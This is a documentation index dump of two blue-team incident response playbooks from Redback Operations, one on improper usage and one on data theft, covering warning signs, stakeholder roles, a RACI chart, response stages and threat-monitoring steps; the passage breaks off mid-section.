Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#56-recovery","content":" Objective: Restarting company operations and returning impacted systems and data to normal functioning.Activities:Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to avert inappropriate usage events in the future.Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#57-post-incident-review","content":" Objective: Assessing the organization's reaction to the issue involving improper usage and determining what worked and what didn't.Activities:Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results.Outcome: Improved incident response capacities and preparedness for occurrences involving improper usage in the future.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Establish and implement a comprehensive strategy for continuous threat monitoring specifically targeting improper usage incidents. *Activities: Objectives: Clearly define the objectives for threat monitoring, such as detecting unauthorized access attempts, identifying improper usage activities, and monitoring unusual network traffic indicative of improper usage incidents.Tools: Select appropriate security tools such as IDS/IPS (Intrusion Detection/Prevention Systems), SIEM (Security Information and Event Management) systems, EDR (Endpoint Detection and Response) solutions, and user behavior analytics software.Baselines: Establish baselines for normal user activity, system behavior, and network traffic patterns to identify deviations that may indicate improper usage activities. Outcome: A well-defined monitoring strategy aligned with Redback Operations' goals, enhancing the ability to detect and respond to improper usage threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective : Deploy and configure monitoring tools across the organization’s infrastructure to detect improper usage threats. Activities: Install and Configure Tools: Deploy the selected monitoring tools across networks, systems, and endpoints. Ensure they are configured to detect improper usage-related activities and collect relevant data.Integrate with Threat Intelligence: Integrate monitoring tools with threat intelligence feeds to enhance the detection of known and emerging improper usage threats.Enable Logging: Ensure logging is enabled on critical systems, networks, and applications. Centralize log collection for efficient analysis and correlation. Outcome: Comprehensive deployment and integration of monitoring solutions providing detailed insights into potential improper usage threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous monitoring and analysis to promptly detect and respond to improper usage threats. Activities: Real-Time Monitoring: Implement real-time monitoring to continuously observe user activities, system behavior, and network traffic, facilitating the immediate detection of improper usage activities.Anomaly Detection: Utilize behavioral analytics and machine learning to identify anomalies and deviations from established baselines that may indicate improper usage activities.Correlate Events: Correlate events from various sources to identify patterns that may indicate coordinated improper usage attacks or persistent threats. Outcome: Enhanced capability to detect improper usage threats promptly, enabling swift response to mitigate potential impacts.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected threats through a robust alerting system. Activities: Set Alert Thresholds: Establish thresholds for different types of alerts based on severity and potential impact.Automated Alerts: Configure automated alerts to notify the security team of detected improper usage threats. Ensure alerts provide sufficient context for prompt assessment and action.Prioritize Alerts: Implement a system to prioritize alerts based on their severity and potential impact, focusing on the most critical threats first. Outcome: Timely and effective response to detected improper usage threats, reducing the risk of significant damage.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified improper usage threats. Activities: Initial Triage: Perform initial triage to verify the validity and potential impact of alerts. Determine the severity of the threat and whether the alert is a false positive.Detailed Analysis: Conduct in-depth analysis of confirmed alerts to understand the nature and extent of the improper usage threat. Use forensic tools and techniques to gather information and trace the source of the threat.Containment and Eradication: Initiate containment measures to prevent further damage if a threat is confirmed. Execute necessary eradication procedures to remove the improper usage threat from the environment. Outcome: Effective investigation and mitigation of improper usage threats, ensuring minimal impact on the organization.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response and identify areas for improvement. Activities: Document Findings: Record all details of the incident, including detection, analysis, and response actions taken.Review and Improve: Conduct a review of the monitoring and response processes post-incident to identify strengths, weaknesses, and lessons learned.Update Monitoring Tools: Update monitoring tools, configurations, and thresholds based on the findings to enhance future threat detection and response capabilities. Outcome: Continuous improvement of incident response and threat monitoring processes, ensuring better preparedness for future improper usage incidents.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s threat monitoring strategy and tools. Activities: Regular Audits: Conduct regular audits to ensure monitoring tools and strategies remain effective and up to date with the latest threats.Training and Awareness: Provide ongoing training to security personnel on the latest threats and best practices for monitoring and response.Adapt to New Threats: Continuously adapt the monitoring strategy to address emerging threats. Stay informed about the latest threat intelligence and incorporate it into monitoring processes. Outcome: A proactive and adaptive threat monitoring strategy that evolves with the changing threat landscape.  ","version":"Next","tagName":"h3"},{"title":"7 Terminology​","type":1,"pageTitle":"Improper Usage Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Improper Usage Incident Response Playbook#7-terminology","content":" Intrusion Detection System (IDS): Monitors network traffic for indications of malicious activity, unauthorized access, or security lapses. It analyses network packets and system logs to identify potential security risks. Security Information and Event Management (SIEM): Provides real-time visibility into security incidents by collecting, correlating, and analysing security event data from various sources. SIEM enhances overall security posture and resilience against improper usage incidents. Vulnerability Assessment: A preventive strategy to identify and fix security flaws in networks and systems. It involves regular scanning and analysis to find known vulnerabilities, misconfigurations, or weaknesses. Zero-Day Vulnerabilities: Security holes in software or systems that were previously undiscovered or revealed, making organizations vulnerable to exploitation. Proactive measures such as threat intelligence sharing, and patch management are essential to handle new threats. Tactics, Techniques, and Procedures (TTPs): Specific methods used by threat actors to achieve their objectives, including the tools and strategies employed during an attack. Indicators of Compromise (IOCs): Artifacts observed on a network or in an operating system that indicate a security breach, such as unusual file changes, network traffic, or system behaviors. ","version":"Next","tagName":"h2"},{"title":"Data-Theft Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#1-introduction","content":" An organization's reputation may be harmed, confidential data may be compromised, and financial losses may ensue from data theft occurrences. To minimise the effects of data theft events and protect organisational assets, this playbook offers methods and principles for doing so.  ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#11overview","content":" Identification, containment, mitigation, and recovery from data theft events may be done in an organised manner with the help of the Data Theft Incident Response Playbook. It does this by defining roles, responsibilities, and procedures that facilitate an effective reaction to reduce the negative effects on Redback Operations' operations, reputation, and stakeholders.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#12-purpose","content":" This playbook's goals are to:  -Provide a standardised framework for handling instances of data theft. -Make sure that data breaches are quickly discovered and contained. -Reduce the negative impact that data theft has on operations, stakeholders, and reputation. -Encourage coordination, cooperation, and dialogue amongst stakeholders and reaction teams.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#13-attack-definition","content":" The act of gaining unauthorised access to, leaking, or disclosing private firm information—such as financial records, intellectual property, and personally identifiable information (PII)—is known as data theft. Numerous strategies, such as malware, social engineering, phishing, external attacks, and insider threats, might cause this.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#14scope","content":" This playbook includes all instances of data theft that impact the networks, systems, applications, and data assets of the organisation. It covers incidents that affect partners, consumers, staff members, and outside vendors, among other internal and external stakeholders. Both deliberate and unintentional instances of data theft are included in the scope.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#2-attack-types","content":" The different types of Data-Theft attacks include:  ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#21-insider-threat","content":" An insider threat is when someone who works for the company—a contractor, business partner, or employee, for example—misuses their access to steal information.  Signs of Insider Threat:  Abnormal access patterns: Workers accessing private data after hours or on the weekends, in addition to their regular duties.Illegal data access: Workers gaining access to systems or files for which they are not normally authorised.Unauthorised information sharing: Workers disclosing private information to outside parties or persons they are not authorised to.Behavioural or performance changes: Workers displaying abrupt behavioural shifts, such heightened confidentiality or attempts to avoid discovery.Employee discontent or unhappiness: When staff members voice their unhappiness with their jobs or the company, it may spark aggressive behaviour.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attack​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#22-external-attack","content":" Data theft carried out by external parties, such as nation-state enemies, hackers, or cybercriminals, is referred to as an external attack.  Signs of External Attack:  Illegal entry attempts: Brute force attacks or suspicious login attempts directed at the networks or systems of the company.Unusual patterns of network traffic: Distinctive communication patterns or massive amounts of data being moved to other sites are examples of anomalies in network traffic.Malicious software or malware presence: Finding malware problems, including ransomware, trojans, or keyloggers, on the company's networks or systems.Phishing attempts: Getting shady emails or communications that try to fool staff members into disclosing private information or installing malicious software.Exploitation of applications or system vulnerabilities: Identification of attempted or accomplished exploitation of known weaknesses in the infrastructure of the company, such as improperly configured systems or unpatched software.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breaches​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#23-data-breaches","content":" Data breaches happen when unapproved parties obtain entry to confidential data that is kept on file by a company.  Signs of Data Breaches:  Unexpected modifications to a user's rights or access authorisation.Unauthorised access attempts indicated by anomalies in system logs.Abnormal network activity patterns, such massive data transfers to other addresses.Conditions in user behaviour, including accessing private information after hours.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Attacks​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#24-phishing-attacks","content":" Phishing attacks include sending people false emails or messages with the intention of fooling them into disclosing private information, including login passwords or bank account information.  Signs of Phishing Attacks:  Getting faked or unknown sender emails that raise red flags.Email or message requests for private information, including account numbers or passwords.Links in emails that take recipients to phoney websites intended to steal login information.Sent with bad grammar or poor writing quality.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attacks​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#25-ransomware-attacks","content":" Ransomware attacks entail the introduction of software into a victim's computer or network, encrypting files and requesting payment for the key to unlock them.  Signs of Ransomware Attacks:  Unable to access folders or files because they are encrypted.The appearance of messages requesting money in order to unlock the ransom.Abnormal network behaviour as the malware propagates.The existence of files or processes connected to ransomware on compromised computers.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#26-credential-theft","content":" Theft of login credentials, which include usernames and passwords, from people or organisations is known as credential theft. The goal is to obtain unauthorised access to accounts or systems.  Signs of Credential Theft:  Notifications of illegal access to systems or user accounts.Unusual locations or a pattern of unsuccessful login attempts are examples of anomalies in login behaviour.Malware that is intended to intercept keystrokes or steal passwords that have been stored.Using credentials that have been stolen to gain access to private data or carry out unauthorised activities.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#3-stakeholders","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#31-it-security-team","content":" Lead: Daniel McAulay (Senior Project Leader) The IT security team oversees overseeing and maintaining the company's security infrastructure, keeping an eye out for any security risks, and handling instances of data theft.  Roles and Responsibilities:  Examine and evaluate security events to ascertain the extent of identity theft.Put controls and security measures in place to stop more illegal access.Work together with the incident response team to handle and lessen the effects of occurrences involving data theft.To find the source of security breaches and stop such situations in the future, do forensic analysis.Advise appropriate stakeholders and senior management on security enhancements and incident response protocols.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#32-incident-response-team","content":" Lead: Devika Sivakumar (Blue Team Leader) The incident response team oversees overseeing the incident response procedure and organising the organization's reaction to occurrences involving data theft.  Roles and Responsibilities:  Determine the scope and consequences of data theft occurrences, then take the necessary corrective action.Organise staff and resources to control and lessen the effects of instances involving data theft.Gather information for a possible legal action by conducting forensic investigations to ascertain the source and extent of data theft.Inform all relevant parties about incident reaction and recovery efforts, including customers, third-party vendors, senior management, and the IT security team.To improve the organization's incident response skills, capture best practices and lessons gained from data theft events in documentation.To find the source of security breaches and stop such situations in the future, do forensic analysis.Advise appropriate stakeholders and senior management on security enhancements and incident response protocols.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#33-communication-team","content":" Lead: Kaleb Bowen (Company Lead) The communication team oversees overseeing both internal and outside communications about cases of data theft and making sure that messages are clear and consistent.  Roles and Responsibilities:  Create and implement communication plans to notify relevant parties—such as staff members, clients, and outside suppliers—about instances of data theft.To respond to questions and concerns from stakeholders, create and disseminate communication pieces including news releases, statements, and FAQs.Oversee media and public relations initiatives to safeguard the company's image and lessen the damaging effects of data theft occurrences.Give the incident response team and senior leadership regular reports on the state of stakeholder engagement and communication initiatives.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#34-customers","content":" Customers are people or organisations that may be impacted by instances of data theft and have a stake in the goods or services offered by the company.  Roles and Responsibilities:  Report any unauthorised or questionable behaviour pertaining to their transactions or accounts.Contribute to the data theft incident investigation by giving the incident response team pertinent data or supporting documentation.Observe the advice and guidelines provided by the organisation to safeguard personal information and lessen the effects of data theft events.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#35-third-party-vendors","content":" Third-party vendors are outside companies that supply the company with goods, services, or support; they may also have access to its networks, systems, or data.  Roles and Responsibilities:  Work together with the incident response team to find and fix security flaws in their services or products.When managing and investigating data theft situations that affect the organization's networks or systems, offer support and help.Respect the terms of the contract and any legal requirements pertaining to data security and privacy. This includes reporting security breaches and helping with incident response.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart:​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#raci-chart","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tSenior Management\tLegal and Compliance\tCustomers\tThird-Party VendorsPreparation\tR, C\tA, R\tI\tI\tC\tI\tI Establishing incident response team\tA\tR\tI\tI\tC\tI\tI Developing data theft response procedures\tA, R\tR, C\tI\tC\tC\tI\tI Conducting training and practice sessions\tA, R\tR\tI\tI\tI\tI\tI Implementing data protection systems\tA, R\tR\tI\tI\tI\tI\tI Detection\tA, R\tR\tI\tI\tI\tI\tI Monitoring system logs and network traffic\tR\tA, R\tI\tI\tI\tI\tI Using IDS and SIEM tools\tA, R\tR\tI\tI\tI\tI\tI Analyzing alerts\tA, R\tR\tI\tI\tI\tI\tI Analysis\tA, R\tR\tI\tI\tI\tI\tI Collecting data for forensic analysis\tA, R\tR\tI\tI\tI\tI\tI Identifying attack methods\tA, R\tR\tI\tI\tI\tI\tI Determining impact\tA, R\tR\tI\tI\tI\tI\tI Containment\tA, R\tR\tI\tI\tI\tI\tI Isolating compromised systems\tA, R\tR\tI\tI\tI\tI\tI Implementing safeguards\tA, R\tR\tI\tI\tI\tI\tI Blocking unauthorized access\tA, R\tR\tI\tI\tI\tI\tI Eradication\tA, R\tR\tI\tI\tI\tI\tI Removing compromised data\tA, R\tR\tI\tI\tI\tI\tI Patching vulnerabilities\tA, R\tR\tI\tI\tI\tI\tI Updating security policies\tA, R\tR\tI\tI\tI\tI\tI Recovery\tA, R\tR\tI\tI\tI\tI\tI Restoring backups\tA, R\tR\tI\tI\tI\tI\tI Rebuilding systems\tA, R\tR\tI\tI\tI\tI\tI Conducting user awareness training\tA, R\tR\tI\tI\tI\tI\tI Post-Incident Review\tA, R\tR\tI\tI\tI\tI\tI Reviewing incident response process\tA, R\tR\tI\tI\tI\tI\tI Documenting best practices\tA, R\tR\tI\tI\tI\tI\tI Updating response procedures\tA, R\tR\tI\tI\tI\tI\tI Communication Plan\tC\tC\tA, R\tI\tC\tI\tI Creating communication plans\tC\tC\tA, R\tI\tC\tI\tI Drafting communication materials\tC\tC\tA, R\tI\tC\tI\tI Managing media relations\tC\tC\tA, R\tI\tC\tI\tI Providing updates\tC\tC\tA, R\tI\tC\tI\tI  Key:  R: Responsible (Who does the work)A: Accountable (Ultimate ownership)C: Consulted (Provides input)I: Informed (Kept up to date)  Key Definitions: • Responsible (R): The individual(s) who perform the work to achieve the task. • Accountable (A): The individual who is ultimately answerable for the correct and thorough completion of the task. • Consulted (C): The individual(s) whose opinions are sought. • Informed (I): The individual(s) who are kept up-to-date on progress and outcomes.  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  Notify IT Security Analyst: The IT security analyst is instantly contacted to begin incident response preparations upon detection of data theft.  Identification (Identify): Red  Contain the Incident; Isolate Systems: Containment procedures, such as isolating impacted systems to prevent additional unauthorised access, are put in place if the issue is continuing.  Notification (Notif): Violet  Change Credentials; Malware Scan: Changing passwords and running malware scans are two urgent steps that should be taken after a successful isolation to lessen the effect of the occurrence.Review Malicious Activities; Notify Relevant Teams: Malicious activity is found through additional analysis, and teams who need to respond are alerted so that they may plan accordingly.  Containment (Contain): Sky Blue  Error - Unable to Isolate; Escalate: Senior analysts are notified to resolve the issue and the incident is escalated if the impacted systems cannot be isolated.  Eradication (Erad): Light Green  Document Incident; Eradicate: To eliminate any last hazards and return to regular operations, the occurrence is recorded, and eradication procedures are put in place.  Recovery (Recover): Brown  Monitor for Further Activities; Recover: To guarantee the organization's resilience, recovery actions are started and ongoing monitoring for additional activities is carried out.  Post-Incident Actions (Post): Light pink  Continue Monitoring; Post-Incident Review: Continuous observation persists, and a post-event assessment is carried out to appraise the efficacy of the reaction and pinpoint opportunities for enhancement.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#51-preparation","content":" • Objective: Establishing the rules, processes, and resources required to properly handle cases of data theft is the main goal of the preparation phase.  • Activities:  Forming an incident response group with clearly defined duties.Creating processes and strategies for incident response that include escalation routes and communication protocols.Regularly providing incident responders with training and drills to guarantee preparedness.Putting security measures and monitoring systems in place to identify and stop instances of data theft.  • Outcome: A well-equipped company capable of reacting to instances of data theft swiftly and efficiently.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#52-detection","content":" • Objective: Finding signs of illegal access or data theft within the organization's networks and systems is the task of the detection stage.  • Activities:  Keeping an eye out for suspicious activities, such as strange access patterns or unauthorised file transfers, by monitoring system logs and network traffic.Putting in place security information and event management (SIEM) and intrusion detection system (IDS) solutions to find any attacks.Examining abnormalities and alarms to differentiate between harmful and legitimate activity.  • Outcome: Early data theft event identification allows for quick response and mitigation actions.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#53-analysis","content":" • Objective: The investigation and comprehension of the type and extent of the data theft occurrence are the main objectives of the analysis stage.  • Activities:  Gathering information and determining the origin and scope of the data theft through forensic analysis.Examining hacked networks and systems to ascertain the attack strategies and the effects on compromised data.Recognising threat actors' tactics, methods, and procedures (TTPs) and indications of compromise (IOCs).  • Outcome: A thorough comprehension of the data theft occurrence, considering its attribution, consequences, and underlying reasons.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#54-containment","content":" • Objective: To stop more unauthorised access or data exfiltration, the containment step entails reducing the incident's effect and spread.  • Activities: -Isolate hacked systems to stop attackers from moving widely.  Put access restrictions in place to prevent unwanted access to private information.To stop more harm, quarantine or block rogue programmes, data, or network traffic.  • Outcome: Successful management of the data theft event, reducing the damage it caused to the systems and data of the company.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#55-eradication","content":" • Objective: The goal of the eradication step is to eradicate any remaining risks or vulnerabilities as well as the attackers' presence from the company's IT infrastructure and networks.  • Activities:  Deleting harmful software and data from hacked computers and returning them to a safe condition.Upgrading or patching susceptible systems and software to stop further exploitation. -Review and update security policies and practices to address any identified weaknesses or vulnerabilities.  • Outcome: Eradicating all evidence of the data theft event and reducing vulnerabilities to stop such ones in the future.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#56-recovery","content":" • Objective: Restoring impacted systems and information to regular functioning and carrying on business as usual are the objectives of the recovery stage.  • Activities:  Restoring systems and data backups that were hacked to guarantee data availability and integrity.Rebuild or reconfigure systems to enhance security and prevent similar incidents.Conduct user education and awareness campaigns to prevent future data theft incidents.  • Outcome: Full restoration of operations and services with enhanced security measures to reduce the risk of future incidents.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#57-post--incident-review","content":" • Objective: Evaluate the organization’s response to the data theft incident and identify areas for improvement.  • Activities: -Conduct a thorough review of the incident response process, identifying strengths, weaknesses, and areas for improvement.  To improve incident response skills in the future, record best practices and lessons learned.Revise security protocols, policies, and incident response plans in light of the review's conclusions.  • Outcome: Constant enhancement of incident response capacities and preparedness for upcoming data theft events.  ","version":"Next","tagName":"h3"},{"title":"6.Steps for Monitoring Threats​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#6steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h3"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Establish and put into action a thorough plan for ongoing threat surveillance.  Activities:  Objectives: Clearly state your objectives for using threat monitoring, such as finding malware, detecting unauthorised access, or keeping an eye out for unusual network traffic.Tools: Select the technology and security tools that will best support your monitoring goals. IDS/IPS (Intrusion Detection/Prevention Systems), SIEM (Security Information and Event Management) systems, and EDR (Endpoint Detection and Response) solutions are examples of common technologies.Baselines: Set baselines of usual activity for user activity, system behaviour, and network traffic. This makes it easier to spot variations that could point to possible dangers.  Outcome: A clear monitoring plan that improves threat detection skills and is in line with company's objectives.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Install and set up the chosen monitoring tools throughout the infrastructure of the company.  Activities:  Install and Configure Tools: Deploy the selected monitoring tools across your network, systems, and endpoints. Ensure they are properly configured to collect and analyze relevant data.Integrate with Threat Intelligence: To improve your monitoring systems' capacity to identify existing attacks and newly discovered vulnerabilities, integrate them with threat intelligence streams.Enable Logging: Make sure that the logging feature is enabled on all important networks, applications, and systems. Log collecting should be centralised for effective analysis and correlation.  Outcome: Efficient implementation and assimilation of surveillance systems offering all-encompassing insight into any hazards.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain constant data monitoring and analysis to quickly identify any security risks.  Activities:  Real-Time Monitoring: Use real-time monitoring to keep an eye on user activity, system behaviour, and network traffic all the time. This makes it easier to spot questionable activity as it happens.Anomaly Detection: Utilise behavioural analytics and machine learning to find anomalies that depart from predetermined baselines. This may aid in locating hazards that were previously unidentified.Correlate Events: Connect occurrences from many sources to find trends that could point to a well-planned assault or ongoing danger.  Outcome: Improved capacity to identify hazards and take immediate action to prevent any harm.  ","version":"Next","tagName":"h3"},{"title":"6.4 Deploy Monitoring Solutions​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#64-deploy-monitoring-solutions","content":" Objective: By using a reliable alerting system, you can make sure that risks are addressed quickly and effectively.  m Activities:  Set Alert Thresholds: Set thresholds according to the seriousness and possible consequences of the identified danger for various kinds of alerts.Automated Alerts: Set up automated notifications to inform the security staff to any dangers. Make sure warnings have enough context to allow for prompt evaluation and action.Prioritize Alerts: Put in place a system that ranks warnings according to their importance and possible consequences. This makes it easier to concentrate on the biggest risks first.  Outcome: Prompt and efficient handling of any hazards, lowering the possibility of serious harm.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#65-investigate-and-respond","content":" Objective: Undertake comprehensive enquiries and implement suitable measures to alleviate identified hazards.  Activities:  Initial Triage: Sort the alerts initially to ascertain their veracity and possible significance. This entails determining the threat's seriousness and determining if the warning is a false positive.Detailed Analysis: Analyse genuine warnings in-depth to determine the kind and extent of the danger. To obtain information and track out the source of the danger, employ forensic instruments 